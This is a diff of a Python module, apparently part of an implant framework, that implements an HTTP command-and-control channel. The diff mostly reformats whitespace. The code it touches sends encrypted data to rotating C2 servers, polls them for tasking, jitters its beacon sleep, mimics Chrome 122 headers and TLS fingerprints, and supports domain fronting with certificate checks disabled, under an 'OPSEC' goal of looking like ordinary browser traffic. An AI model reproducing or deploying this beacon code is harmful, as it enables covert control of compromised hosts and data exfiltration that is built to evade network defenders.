@@ -16,6 +16,7 @@ OPSEC:
   - No port 4444, no plaintext command strings in HTTP body.
   - All beacon traffic indistinguishable from browser HTTPS session.
 """
+
 from __future__ import annotations
 
 import base64
@@ -30,12 +31,12 @@ _OFFLINE = os.getenv("FORGE_OFFLINE_STRICT", "").lower() in ("1", "true", "yes")
 
 # Default Chrome 122 / Windows 11 header set
 _DEFAULT_HEADERS = {
-    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.9",
     "Accept-Encoding": "gzip, deflate, br",
-    "Cache-Control":   "no-cache",
-    "Pragma":          "no-cache",
-    "Connection":      "keep-alive",
+    "Cache-Control": "no-cache",
+    "Pragma": "no-cache",
+    "Connection": "keep-alive",
 }
 
 # AES key placeholder — operator MUST replace before deployment
@@ -58,27 +59,27 @@ class HTTPChannel:
 
     def __init__(
         self,
-        c2_urls:      list[str],
+        c2_urls: list[str],
         front_domain: Optional[str] = None,
-        session_key:  str           = _KEY_PLACEHOLDER,
-        user_agent:   Optional[str] = None,
-        interval:     int           = 60,
-        jitter_pct:   int           = 20,
+        session_key: str = _KEY_PLACEHOLDER,
+        user_agent: Optional[str] = None,
+        interval: int = 60,
+        jitter_pct: int = 20,
     ) -> None:
         if not c2_urls:
             raise ValueError("At least one C2 URL is required.")
-        self._c2_urls     = c2_urls
-        self._front       = front_domain
-        self._key         = bytes.fromhex(session_key) if len(session_key) == 64 else None
-        self._ua          = user_agent or (
+        self._c2_urls = c2_urls
+        self._front = front_domain
+        self._key = bytes.fromhex(session_key) if len(session_key) == 64 else None
+        self._ua = user_agent or (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/122.0.0.0 Safari/537.36"
         )
-        self._interval    = interval
-        self._jitter_pct  = jitter_pct
-        self._session     = self._make_session()
-        self._active_idx  = 0
+        self._interval = interval
+        self._jitter_pct = jitter_pct
+        self._session = self._make_session()
+        self._active_idx = 0
 
     # ── Public interface ───────────────────────────────────────────────────────
 
@@ -88,13 +89,11 @@ class HTTPChannel:
             _LOG.debug("FORGE_OFFLINE_STRICT: HTTP send suppressed.")
             return False
         payload = self._encrypt(data)
-        url     = self._c2_urls[self._active_idx]
+        url = self._c2_urls[self._active_idx]
         for attempt, c2 in enumerate(self._rotate_c2()):
             try:
                 headers = self._build_headers(c2)
-                resp    = self._session.post(
-                    c2, data=payload, headers=headers, timeout=15
-                )
+                resp = self._session.post(c2, data=payload, headers=headers, timeout=15)
                 if resp.status_code in (200, 204):
                     _LOG.debug("C2 send OK → %s", c2)
                     return True
@@ -110,9 +109,7 @@ class HTTPChannel:
         for c2 in self._rotate_c2():
             try:
                 headers = self._build_headers(c2)
-                resp    = self._session.get(
-                    f"{c2}/poll", headers=headers, timeout=timeout
-                )
+                resp = self._session.get(f"{c2}/poll", headers=headers, timeout=timeout)
                 if resp.status_code == 200 and resp.content:
                     return self._decrypt(resp.content)
                 if resp.status_code == 204:
@@ -123,7 +120,7 @@ class HTTPChannel:
 
     def sleep(self) -> None:
         """Gaussian-jittered sleep between beacon cycles."""
-        sigma  = self._interval * (self._jitter_pct / 100)
+        sigma = self._interval * (self._jitter_pct / 100)
         actual = max(5.0, random.gauss(self._interval, sigma))
         _LOG.debug("Beacon sleep %.1fs (jitter ±%d%%)", actual, self._jitter_pct)
         time.sleep(actual)
@@ -138,6 +135,7 @@ class HTTPChannel:
 
     def _build_headers(self, c2_url: str) -> dict:
         from urllib.parse import urlparse
+
         headers = dict(_DEFAULT_HEADERS)
         headers["User-Agent"] = self._ua
         if self._front:
@@ -159,7 +157,8 @@ class HTTPChannel:
         try:
             from Crypto.Cipher import AES
             from Crypto.Random import get_random_bytes
-            nonce  = get_random_bytes(12)
+
+            nonce = get_random_bytes(12)
             cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
             ct, tag = cipher.encrypt_and_digest(data)
             return base64.b64encode(nonce + tag + ct)
@@ -172,7 +171,8 @@ class HTTPChannel:
             return base64.b64decode(raw)
         try:
             from Crypto.Cipher import AES
-            blob  = base64.b64decode(raw)
+
+            blob = base64.b64decode(raw)
             nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
             cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
             return cipher.decrypt_and_verify(ct, tag)
@@ -183,15 +183,23 @@ class HTTPChannel:
     def _make_session(self):
         try:
             from curl_cffi import requests as cffi_requests
+
             kwargs: dict = {"impersonate": "chrome122"}
             if self._front:
                 kwargs["verify"] = False  # fronting uses CDN cert; no hostname match
             return cffi_requests.Session(**kwargs)
         except ImportError:
             import urllib.request
+
             class _FallbackSession:
-                def post(self, url, **kw): return type("R", (), {"status_code": 0, "content": b""})()
-                def get(self, url, **kw):  return type("R", (), {"status_code": 0, "content": b""})()
-                def close(self): pass
+                def post(self, url, **kw):
+                    return type("R", (), {"status_code": 0, "content": b""})()
+
+                def get(self, url, **kw):
+                    return type("R", (), {"status_code": 0, "content": b""})()
+
+                def close(self):
+                    pass
+
             _LOG.warning("curl_cffi unavailable; HTTP channel degraded to no-op.")
             return _FallbackSession()
